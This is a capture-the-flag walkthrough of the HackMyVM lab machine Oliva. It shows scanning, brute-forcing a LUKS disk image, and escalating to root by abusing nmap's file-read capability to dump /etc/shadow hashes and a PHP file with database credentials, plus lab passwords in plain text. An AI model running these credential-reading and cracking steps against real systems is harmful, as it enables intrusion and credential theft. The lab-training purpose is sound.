---
title: CTF Walkthrough for HackMyVM Machine Oliva
category: [Walkthrough, CTF]
tags: [HackMyVM, Writeup, Capabilities]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-09-16-oliva/box-oliva.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Oliva a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Oliva<br>
Goal: Get two flags<br>
OS: Linux<br>
Download link: [Oliva](https://downloads.hackmyvm.eu/oliva.zip)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>
3) bruteforce-luks<br>

## Reconnaissance
On startup, the machine reveals its IP address in the subnet where it is located so no need for us to perform host discovery. In this subnet, its IP address appears to be 10.0.2.18. We then use this IP address to perform a service scan on the target to enumerate services running on open ports
```bash
┌──(pentester㉿kali)-[~/Oliva/Scans/Services]
└─$sudo nmap -n 10.0.2.18 -sV -sC -oN service-scan.nmap

[sudo] password for whitemiller: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-15 19:33 BST
Nmap scan report for 10.0.2.18
Host is up (0.00013s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 6d:84:71:14:03:7d:7e:c8:6f:dd:24:92:a8:8e:f7:e9 (ECDSA)
|_  256 d8:5e:39:87:9e:a1:a6:75:9a:28:78:ce:84:f7:05:7a (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.22.1
MAC Address: 08:00:27:22:DC:8D (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds
```
It can be observed that our target runs an SSH and an Nginx web server. Let us visit the web application to see how it looks like
![](/assets/img/posts/walthrough/hackmyvm/2024-09-16-oliva/1-browse.png)

This web application still has the default index.html welcome page of the Nginx web server. This page does help us so much so, let's fuzz this web application to discover any hidden file of the directory.
```bash
┌──(pentester㉿kali)-[~/Oliva/Scans/Web]
└─$ffuf -ic -c -u http://10.0.2.18/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.txt

<SNIP>

index.php               [Status: 200, Size: 69, Words: 8, Lines: 6, Duration: 4ms]
index.html              [Status: 200, Size: 615, Words: 55, Lines: 24, Duration: 6ms]
                        [Status: 200, Size: 615, Words: 55, Lines: 24, Duration: 22ms]
                        [Status: 200, Size: 615, Words: 55, Lines: 24, Duration: 3ms]
:: Progress: [882184/882184] :: Job [1/1] :: 7692 req/sec :: Duration: [0:01:48] :: Errors: 0 ::
```

We discover a new web page named index.php, when we visit this page we see an interesting message telling us how to obtain the root password. Upon clicking on the link we download a file of 20MB.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-16-oliva/2-browse.png)
![](/assets/img/posts/walthrough/hackmyvm/2024-09-16-oliva/2-browse-source.png)

This file does not have any extension so, let's use the files command to obtain information about the file type. 
```bash
┌──(pentester㉿kali)-[~/Oliva/Misc Files]
└─$file oliva              
oliva: LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, salt 0x14fa423af24634e8..., UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., at 0x1000 {"keyslots":{"0":{"type":"luks2","key_size":64,"af":{"type":"luks1","stripes":4000,"hash":"sha256"},"area":{"type":"raw","offse
```

## Exploitation

The file command reveals that this file is indeed a LUKS encrypted file. This may be our first time to hear about this, let's browse the web to understand what is LUKS encryption and if we can bruteforce it.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-16-oliva/google-search-1.png)

In the image above, we can see that LUKS encryption is used for disk encryption. We can deduce we surely download an encrypted disk file. In the output of the file command, we can see that version 2 of LUKS encryption is used which is not supported by Hashcat. Kali Linux provides bruteforce-luks a tool used to try to discover a password for encrypted LUKS volume. Let's use this tool to brute force the password used for the encrypted disk.
```bash
┌──(pentester㉿kali)-[~/Oliva/Misc Files]
└─$ bruteforce-luks -f .rockyou.txt oliva 
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.

Tried passwords: 970
Tried passwords per second: 0.480674
Last tried password: <REDACTED>

Password found: <REDACTED>
```
We see that the user indeed used a weak password and we successfully bruteforce it. We can use this password to mount the disk to a folder on our computer and explore its content. We can follow the steps below to mount the disk to a folder on our attack host.
```bash
┌──(pentester㉿kali)-[~/Oliva/Misc Files]
└─$sudo cryptsetup luksOpen oliva oliva-drive
Enter passphrase for oliva: 

┌──(pentester㉿kali)-[~/Oliva/Misc Files]
└─$ mkdir mount-oliva
┌──(pentester㉿kali)-[~/Oliva/Misc Files]
└─$ls -la /dev/mapper/oliva-drive 
lrwxrwxrwx 1 root root 7 Sep 16 12:59 /dev/mapper/oliva-drive -> ../dm-1
┌──(pentester㉿kali)-[~/Oliva/Misc Files]
└─$sudo mount /dev/mapper/oliva-drive  ./mount-oliva      
┌──(pentester㉿kali)-[~/Oliva/Misc Files]
└─$ls mount-oliva                
lost+found  mypass.txt
```

We can see an interesting file named mypass.txt in the folder we mounted the disk on. Let's read this folder.
```bash
┌──(pentester㉿kali)-[~/Oliva/Misc Files]
└─$cat mount-oliva/mypass.txt 
<REDACTED>
```

The folder contains a string that resembles a password. Let's use this password to log in through SSH. Remember that in the message we saw on the index.php page, the name oliva was mentioned so, let's use this as our username.
```bash
┌──(pentester㉿kali)-[~/Oliva]
└─$ssh oliva@10.0.2.18
oliva@10.0.2.18's password: 
Linux oliva 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64

<SNIP>
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jul  4 10:27:00 2023 from 192.168.0.100
oliva@oliva:~$ ls
user.txt
```
## Post Exploitation

We successfully log in and we gain access to the user flag. Now we can use this access to enumerate the system internally to escalate our privileges. One easy method to escalate privileges is to enumerate files with special capabilities. We can enumerate these files as shown below.
```bash
oliva@oliva:/tmp$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin 2>/dev/null -exec /sbin/getcap {} \; 
/usr/bin/nmap cap_dac_read_search=eip
/usr/bin/ping cap_net_raw=ep
```

We see that Nmap has the  **cap_dac_read_search** capability, cap_dac_read_search enables a process to bypass permissions for reading files and for reading and executing directories. Its primary use is for file searching or reading purposes. In this case, we can use Nmap to read sensitive files as root such as the /etc/shadow file containing hashes of all users on the system including root.
```bash
oliva@oliva:/tmp$ /usr/bin/nmap  -iL /etc/shadow
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-16 19:03 CEST
Failed to resolve "root:$y$j9T$mJZXSkk0PjMpjwgunTu3a.$xlW8pdbOdxHdqCatq072mj3qQ69To4Gy6WbRwSbY6S3:19542:0:99999:7:::".
<SNIP>
Unable to split netmask from target expression: "oliva:$y$j9T$pud/moDgqqEeyht8CXkZE/$6EY/SqVpTsaEnPKnCxbsdCi8ImRvV86ip0LWF.8.vhD:19542:0:99999:7:::"
Failed to resolve "mysql:!:19542::::::".
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.06 seconds
```
Attempting to crack this password takes a very long amount of time so we can try to enumerate the system further. Remember we had a page named index.php. PHP files usually contain sensitive information like database passwords and API keys. Let's attempt to read this file with our privilege.
```bash
oliva@oliva:~$ TF=$(mktemp)
oliva@oliva:~$ echo 'local f=io.open("/var/www/html/index.php", "rb"); print(f:read("*a")); io.close(f);' > $TF
oliva@oliva:~$ nmap --script=$TF
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-16 19:43 CEST
NSE: Warning: Loading '/tmp/tmp.m5EY3tpiN4' -- the recommended file extension is '.nse'.
Hi oliva,
Here the pass to obtain root:

<?php
$dbname = 'easy';
$dbuser = 'root';
$dbpass = 'Savingmypass';
$dbhost = 'localhost';
?>
<a href="oliva">CLICK!</a>

NSE: failed to initialize the script engine:
<SNIP>
QUITTING!
```

The techniques used above to read files using Nmap can be found on [GTFOBin](https://gtfobins.github.io/gtfobins/nmap/#file-read).
![](/assets/img/posts/walthrough/hackmyvm/2024-09-16-oliva/gtfobin-screenshot.png)

We see that this file contains the database password of the user root. Note that the root user of the database is not always the root user of the system. Let's connect to the database using these credentials and enumerate them further.
```bash
oliva@oliva:~$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 17
Server version: 10.11.3-MariaDB-1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| easy               |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0,015 sec)

MariaDB [(none)]> use easy
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [easy]> show tables;
+----------------+
| Tables_in_easy |
+----------------+
| logging        |
+----------------+
1 row in set (0,000 sec)

MariaDB [easy]> select * from logging;
+--------+------+--------------+
| id_log | uzer | pazz         |
+--------+------+--------------+
|      1 | root | OhItwasEasy! |
+--------+------+--------------+
1 row in set (0,017 sec)
```
From our database enumeration, we see a table containing the password of the root user. We can use this password to log in as the root user and read the second flag on the system.
```bash
oliva@oliva:~$ su root
Contraseña: 
root@oliva:/home/oliva# ls /root/
rutflag.txt
root@oliva:/home/oliva# 
```
## Conclusion
Congratulations! In this walkthrough, you have learned how to brute force encrypted disk and how to exploit the cap_dac_read_search capability in Linux environments. This machine was designed to show how the use of weak passwords for file encryption may seriously impact the security posture of an organisation. Thank you for following up on this walkthrough.
